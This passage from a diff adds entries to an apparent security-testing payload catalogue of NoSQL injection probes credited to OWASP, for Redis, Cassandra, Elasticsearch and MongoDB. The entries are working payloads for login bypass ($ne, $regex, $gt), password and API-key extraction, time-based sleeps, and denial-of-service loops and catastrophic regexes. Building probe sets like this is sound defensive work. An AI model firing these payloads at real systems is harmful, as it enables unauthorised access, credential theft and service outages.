+    "description": "Redis Protocol Injection probe from OWASP. Tests application handling of: *3\\r\\n$3\\r\\nSET\\r\\n$4\\r\\ntest\\...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0079",
+    "name": "Redis Lua Injection",
+    "template": "EVAL \"return redis.call('GET', 'password')\" 0",
+    "description": "Redis Lua Injection probe from OWASP. Tests application handling of: EVAL \"return redis.call('GET',...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0080",
+    "name": "Redis Lua Injection #2",
+    "template": "EVAL \"return redis.call('KEYS', '*')\" 0",
+    "description": "Redis Lua Injection probe from OWASP. Tests application handling of: EVAL \"return redis.call('KEYS'...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0081",
+    "name": "Redis Lua Injection #3",
+    "template": "EVAL \"redis.call('SET', 'hacked', 'true')\" 0",
+    "description": "Redis Lua Injection probe from OWASP. Tests application handling of: EVAL \"redis.call('SET', 'hacke...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0082",
+    "name": "Cassandra CQL Injection",
+    "template": "' OR '1'='1",
+    "description": "Cassandra CQL Injection probe from OWASP. Tests application handling of: ' OR '1'='1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0083",
+    "name": "Cassandra CQL Injection #2",
+    "template": "admin' --",
+    "description": "Cassandra CQL Injection probe from OWASP. Tests application handling of: admin' --",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0084",
+    "name": "Cassandra CQL Injection #3",
+    "template": "admin' /*",
+    "description": "Cassandra CQL Injection probe from OWASP. Tests application handling of: admin' /*",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0085",
+    "name": "Cassandra CQL Injection #4",
+    "template": "' ALLOW FILTERING --",
+    "description": "Cassandra CQL Injection probe from OWASP. Tests application handling of: ' ALLOW FILTERING --",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0086",
+    "name": "Cassandra CQL Injection #5",
+    "template": "' AND token(id) > token(' union select * from users --')",
+    "description": "Cassandra CQL Injection probe from OWASP. Tests application handling of: ' AND token(id) > token(' unio...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0087",
+    "name": "Elasticsearch Query Injection",
+    "template": "{\"query\": {\"match_all\": {}}}",
+    "description": "Elasticsearch Query Injection probe from OWASP. Tests application handling of: {\"query\": {\"match_all\": {}}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0088",
+    "name": "Elasticsearch Query Injection #2",
+    "template": "{\"query\": {\"wildcard\": {\"username\": \"*\"}}}",
+    "description": "Elasticsearch Query Injection probe from OWASP. Tests application handling of: {\"query\": {\"wildcard\": {\"usern...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0089",
+    "name": "Elasticsearch Query Injection #3",
+    "template": "{\"query\": {\"regexp\": {\"password\": \".*\"}}}",
+    "description": "Elasticsearch Query Injection probe from OWASP. Tests application handling of: {\"query\": {\"regexp\": {\"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0090",
+    "name": "Elasticsearch Query Injection #4",
+    "template": "{\"query\": {\"prefix\": {\"apikey\": \"\"}}}",
+    "description": "Elasticsearch Query Injection probe from OWASP. Tests application handling of: {\"query\": {\"prefix\": {\"apikey\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0091",
+    "name": "Elasticsearch Query Injection #5",
+    "template": "{\"query\": {\"bool\": {\"must_not\": {\"term\": {\"role\": \"guest\"}}}}}",
+    "description": "Elasticsearch Query Injection probe from OWASP. Tests application handling of: {\"query\": {\"bool\": {\"must_not\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0092",
+    "name": "Elasticsearch Script Injection (Groovy/Painless)",
+    "template": "{\"script\": {\"source\": \"doc['password'].value\"}}",
+    "description": "Elasticsearch Script Injection (Groovy/Painless) probe from OWASP. Tests application handling of: {\"script\": {\"source\": \"doc['pa...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0093",
+    "name": "Elasticsearch Script Injection (Groovy/Painless) #2",
+    "template": "{\"query\": {\"script_score\": {\"query\": {\"match_all\": {}}, \"script\": {\"source\": \"Math.random()\"}}}}",
+    "description": "Elasticsearch Script Injection (Groovy/Painless) probe from OWASP. Tests application handling of: {\"query\": {\"script_score\": {\"q...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0094",
+    "name": "Elasticsearch Aggregation Injection",
+    "template": "{\"aggs\": {\"passwords\": {\"terms\": {\"field\": \"password\", \"size\": 1000}}}}",
+    "description": "Elasticsearch Aggregation Injection probe from OWASP. Tests application handling of: {\"aggs\": {\"passwords\": {\"terms...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0095",
+    "name": "Elasticsearch Aggregation Injection #2",
+    "template": "{\"aggs\": {\"users\": {\"terms\": {\"field\": \"username.keyword\"}}}}",
+    "description": "Elasticsearch Aggregation Injection probe from OWASP. Tests application handling of: {\"aggs\": {\"users\": {\"terms\": {...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0096",
+    "name": "Array Injection",
+    "template": "username[]=admin&password[]=password",
+    "description": "Array Injection probe from OWASP. Tests application handling of: username[]=admin&password[]=pa...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0097",
+    "name": "Array Injection #2",
+    "template": "{\"username\": [\"$ne\", null], \"password\": [\"$ne\", null]}",
+    "description": "Array Injection probe from OWASP. Tests application handling of: {\"username\": [\"$ne\", null], \"p...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0098",
+    "name": "Type Confusion",
+    "template": "username=admin&password=true",
+    "description": "Type Confusion probe from OWASP. Tests application handling of: username=admin&password=true",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0099",
+    "name": "Type Confusion #2",
+    "template": "username=admin&password=1",
+    "description": "Type Confusion probe from OWASP. Tests application handling of: username=admin&password=1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0100",
+    "name": "Type Confusion #3",
+    "template": "{\"username\": \"admin\", \"password\": true}",
+    "description": "Type Confusion probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0101",
+    "name": "Type Confusion #4",
+    "template": "{\"username\": \"admin\", \"password\": 1}",
+    "description": "Type Confusion probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0102",
+    "name": "Null Byte Injection",
+    "template": "admin%00",
+    "description": "Null Byte Injection probe from OWASP. Tests application handling of: admin%00",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0103",
+    "name": "Null Byte Injection #2",
+    "template": "admin\\x00",
+    "description": "Null Byte Injection probe from OWASP. Tests application handling of: admin\\x00",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0104",
+    "name": "Null Byte Injection #3",
+    "template": "{\"username\": \"admin\\u0000\"}",
+    "description": "Null Byte Injection probe from OWASP. Tests application handling of: {\"username\": \"admin\\u0000\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0105",
+    "name": "Comment Injection",
+    "template": "admin' // comment",
+    "description": "Comment Injection probe from OWASP. Tests application handling of: admin' // comment",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0106",
+    "name": "Comment Injection #2",
+    "template": "admin' /* comment */",
+    "description": "Comment Injection probe from OWASP. Tests application handling of: admin' /* comment */",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0107",
+    "name": "Comment Injection #3",
+    "template": "{\"username\": \"admin' // \", \"password\": \"pass\"}",
+    "description": "Comment Injection probe from OWASP. Tests application handling of: {\"username\": \"admin' // \", \"pa...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0108",
+    "name": "Encoding Bypasses",
+    "template": "{\"username\": {\"$ne\": \"\\u0000\"}}",
+    "description": "Encoding Bypasses probe from OWASP. Tests application handling of: {\"username\": {\"$ne\": \"\\u0000\"}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0109",
+    "name": "Encoding Bypasses #2",
+    "template": "{\"username\": {\"$regex\": \"\\x2e\\x2a\"}}",
+    "description": "Encoding Bypasses probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"\\x2e\\...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0110",
+    "name": "JSON POST Body",
+    "template": "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
+    "description": "JSON POST Body probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0111",
+    "name": "JSON POST Body #2",
+    "template": "{\"username\": {\"$in\": [\"admin\", \"administrator\"]}, \"password\": {\"$exists\": true}}",
+    "description": "JSON POST Body probe from OWASP. Tests application handling of: {\"username\": {\"$in\": [\"admin\",...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0112",
+    "name": "JSON POST Body #3",
+    "template": "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}], \"password\": {\"$gt\": \"\"}}",
+    "description": "JSON POST Body probe from OWASP. Tests application handling of: {\"$or\": [{\"username\": \"admin\"}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0113",
+    "name": "JSON POST Body #4",
+    "template": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^.*\"}}",
+    "description": "JSON POST Body probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0114",
+    "name": "URL Parameters",
+    "template": "?username[$ne]=fake&password[$ne]=fake",
+    "description": "URL Parameters probe from OWASP. Tests application handling of: ?username[$ne]=fake&password[$...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0115",
+    "name": "URL Parameters #2",
+    "template": "?username=admin&password[$gt]=",
+    "description": "URL Parameters probe from OWASP. Tests application handling of: ?username=admin&password[$gt]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0116",
+    "name": "URL Parameters #3",
+    "template": "?username[$regex]=admin&password[$ne]=fake",
+    "description": "URL Parameters probe from OWASP. Tests application handling of: ?username[$regex]=admin&passwo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0117",
+    "name": "URL Parameters #4",
+    "template": "?username[$in][]=admin&password[$exists]=true",
+    "description": "URL Parameters probe from OWASP. Tests application handling of: ?username[$in][]=admin&passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0118",
+    "name": "Cookie Values",
+    "template": "username=admin; password[$ne]=fake",
+    "description": "Cookie Values probe from OWASP. Tests application handling of: username=admin; password[$ne]=...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0119",
+    "name": "Cookie Values #2",
+    "template": "session={\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+    "description": "Cookie Values probe from OWASP. Tests application handling of: session={\"username\":{\"$ne\":nul...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0120",
+    "name": "HTTP Headers",
+    "template": "X-Username: admin",
+    "description": "HTTP Headers probe from OWASP. Tests application handling of: X-Username: admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0121",
+    "name": "HTTP Headers #2",
+    "template": "X-Password: {\"$ne\": \"\"}",
+    "description": "HTTP Headers probe from OWASP. Tests application handling of: X-Password: {\"$ne\": \"\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0122",
+    "name": "HTTP Headers #3",
+    "template": "Authorization: {\"username\": {\"$ne\": null}}",
+    "description": "HTTP Headers probe from OWASP. Tests application handling of: Authorization: {\"username\": {\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0123",
+    "name": "Character-by-Character Extraction",
+    "template": "{\"username\": {\"$regex\": \"^a.*\"}}",
+    "description": "Character-by-Character Extraction probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^a.*\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0124",
+    "name": "Character-by-Character Extraction #2",
+    "template": "{\"username\": {\"$regex\": \"^ad.*\"}}",
+    "description": "Character-by-Character Extraction probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^ad.*...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0125",
+    "name": "Character-by-Character Extraction #3",
+    "template": "{\"username\": {\"$regex\": \"^adm.*\"}}",
+    "description": "Character-by-Character Extraction probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^adm....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0126",
+    "name": "Length-Based Extraction",
+    "template": "{\"password\": {\"$regex\": \"^.{8}$\"}}",
+    "description": "Length-Based Extraction probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^.{8}...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0127",
+    "name": "Length-Based Extraction #2",
+    "template": "{\"password\": {\"$regex\": \"^.{1,100}$\"}}",
+    "description": "Length-Based Extraction probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^.{1,...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0128",
+    "name": "Character Set Testing",
+    "template": "{\"password\": {\"$regex\": \"^[a-z].*\"}}",
+    "description": "Character Set Testing probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^[a-z...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0129",
+    "name": "Character Set Testing #2",
+    "template": "{\"password\": {\"$regex\": \"^[A-Z].*\"}}",
+    "description": "Character Set Testing probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^[A-Z...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0130",
+    "name": "Character Set Testing #3",
+    "template": "{\"password\": {\"$regex\": \"^[0-9].*\"}}",
+    "description": "Character Set Testing probe from OWASP. Tests application handling of: {\"password\": {\"$regex\": \"^[0-9...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0131",
+    "name": "Time-Based",
+    "template": "{\"$where\": \"this.username == 'admin' && sleep(5000)\"}",
+    "description": "Time-Based probe from OWASP. Tests application handling of: {\"$where\": \"this.username == '...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0132",
+    "name": "Time-Based #2",
+    "template": "{\"username\": \"admin\", \"$where\": \"sleep(5000) || true\"}",
+    "description": "Time-Based probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"$where\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0133",
+    "name": "Boolean-Based",
+    "template": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}",
+    "description": "Boolean-Based probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0134",
+    "name": "Boolean-Based #2",
+    "template": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^b\"}}",
+    "description": "Boolean-Based probe from OWASP. Tests application handling of: {\"username\": \"admin\", \"passwor...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0135",
+    "name": "GraphQL-style NoSQL Injection",
+    "template": "{\"filter\": {\"username\": {\"$ne\": null}}}",
+    "description": "GraphQL-style NoSQL Injection probe from OWASP. Tests application handling of: {\"filter\": {\"username\": {\"$ne\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0136",
+    "name": "GraphQL-style NoSQL Injection #2",
+    "template": "{\"where\": {\"password\": {\"$exists\": true}}}",
+    "description": "GraphQL-style NoSQL Injection probe from OWASP. Tests application handling of: {\"where\": {\"password\": {\"$exis...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0137",
+    "name": "GraphQL-style NoSQL Injection #3",
+    "template": "{\"match\": {\"role\": \"admin\"}}",
+    "description": "GraphQL-style NoSQL Injection probe from OWASP. Tests application handling of: {\"match\": {\"role\": \"admin\"}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0138",
+    "name": "REST API Query Parameters",
+    "template": "?filter[username][$ne]=fake",
+    "description": "REST API Query Parameters probe from OWASP. Tests application handling of: ?filter[username][$ne]=fake",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0139",
+    "name": "REST API Query Parameters #2",
+    "template": "?where[password][$exists]=true",
+    "description": "REST API Query Parameters probe from OWASP. Tests application handling of: ?where[password][$exists]=true",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0140",
+    "name": "REST API Query Parameters #3",
+    "template": "?sort[role][$eq]=admin",
+    "description": "REST API Query Parameters probe from OWASP. Tests application handling of: ?sort[role][$eq]=admin",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0141",
+    "name": "Polyglot NoSQL Injection",
+    "template": "' || '1'=='1' || {\"$ne\":\"\"}",
+    "description": "Polyglot NoSQL Injection probe from OWASP. Tests application handling of: ' || '1'=='1' || {\"$ne\":\"\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0142",
+    "name": "Polyglot NoSQL Injection #2",
+    "template": "admin' || true || {\"$ne\": null}",
+    "description": "Polyglot NoSQL Injection probe from OWASP. Tests application handling of: admin' || true || {\"$ne\": null...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0143",
+    "name": "Polyglot NoSQL Injection #3",
+    "template": "{\"$ne\": null} || '1'='1",
+    "description": "Polyglot NoSQL Injection probe from OWASP. Tests application handling of: {\"$ne\": null} || '1'='1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0144",
+    "name": "Denial of Service (DoS) Payloads",
+    "template": "{\"$where\": \"while(true){}\"}",
+    "description": "Denial of Service (DoS) Payloads probe from OWASP. Tests application handling of: {\"$where\": \"while(true){}\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0145",
+    "name": "Denial of Service (DoS) Payloads #2",
+    "template": "{\"$where\": \"for(var i=0;i<99999999;i++){}\"}",
+    "description": "Denial of Service (DoS) Payloads probe from OWASP. Tests application handling of: {\"$where\": \"for(var i=0;i<9999...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0146",
+    "name": "Denial of Service (DoS) Payloads #3",
+    "template": "{\"username\": {\"$regex\": \"^((((((((((a+)+)+)+)+)+)+)+)+)+)$\"}}",
+    "description": "Denial of Service (DoS) Payloads probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \"^((((...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0147",
+    "name": "Express.js/Node.js",
+    "template": "req.body.username[$ne]=null",
+    "description": "Express.js/Node.js probe from OWASP. Tests application handling of: req.body.username[$ne]=null",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0148",
+    "name": "Express.js/Node.js #2",
+    "template": "req.query.password[$gt]=",
+    "description": "Express.js/Node.js probe from OWASP. Tests application handling of: req.query.password[$gt]=",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0149",
+    "name": "Express.js/Node.js #3",
+    "template": "req.cookies.user[$exists]=true",
+    "description": "Express.js/Node.js probe from OWASP. Tests application handling of: req.cookies.user[$exists]=true",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0150",
+    "name": "Django MongoDB",
+    "template": "{\"username__ne\": null, \"password__ne\": null}",
+    "description": "Django MongoDB probe from OWASP. Tests application handling of: {\"username__ne\": null, \"passwo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0151",
+    "name": "Django MongoDB #2",
+    "template": "{\"username__regex\": \"admin\"}",
+    "description": "Django MongoDB probe from OWASP. Tests application handling of: {\"username__regex\": \"admin\"}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0152",
+    "name": "Django MongoDB #3",
+    "template": "{\"password__exists\": True}",
+    "description": "Django MongoDB probe from OWASP. Tests application handling of: {\"password__exists\": True}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0153",
+    "name": "PHP MongoDB",
+    "template": "array(\"username\" => array('$ne' => null))",
+    "description": "PHP MongoDB probe from OWASP. Tests application handling of: array(\"username\" => array('$ne...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0154",
+    "name": "PHP MongoDB #2",
+    "template": "array(\"password\" => array('$gt' => \"\"))",
+    "description": "PHP MongoDB probe from OWASP. Tests application handling of: array(\"password\" => array('$gt...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0155",
+    "name": "Python (PyMongo)",
+    "template": "{\"username\": {\"$ne\": None}, \"password\": {\"$ne\": None}}",
+    "description": "Python (PyMongo) probe from OWASP. Tests application handling of: {\"username\": {\"$ne\": None}, \"p...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0156",
+    "name": "Python (PyMongo) #2",
+    "template": "{\"username\": {\"$regex\": \".*admin.*\", \"$options\": \"i\"}}",
+    "description": "Python (PyMongo) probe from OWASP. Tests application handling of: {\"username\": {\"$regex\": \".*adm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0157",
+    "name": "Unicode Bypass",
+    "template": "{\"username\": {\"$\\u006Ee\": null}}",
+    "description": "Unicode Bypass probe from OWASP. Tests application handling of: {\"username\": {\"$\\u006Ee\": null...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0158",
+    "name": "Unicode Bypass #2",
+    "template": "{\"username\": {\"\\u0024ne\": null}}",
+    "description": "Unicode Bypass probe from OWASP. Tests application handling of: {\"username\": {\"\\u0024ne\": null...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0159",
+    "name": "Case Variation",
+    "template": "{\"username\": {\"$Ne\": null}}",
+    "description": "Case Variation probe from OWASP. Tests application handling of: {\"username\": {\"$Ne\": null}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0160",
+    "name": "Case Variation #2",
+    "template": "{\"username\": {\"$NE\": null}}",
+    "description": "Case Variation probe from OWASP. Tests application handling of: {\"username\": {\"$NE\": null}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0161",
+    "name": "Spacing/Formatting",
+    "template": "{\"username\":{\"$ne\":null}}",
+    "description": "Spacing/Formatting probe from OWASP. Tests application handling of: {\"username\":{\"$ne\":null}}",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "nosql-injection-payloads.txt"
+  },
+  {
+    "id": "nosql-injection-owasp-0162",
+    "name": "Spacing/Formatting #2",
+    "template": "{ \"username\" : { \"$ne\" : null } }",
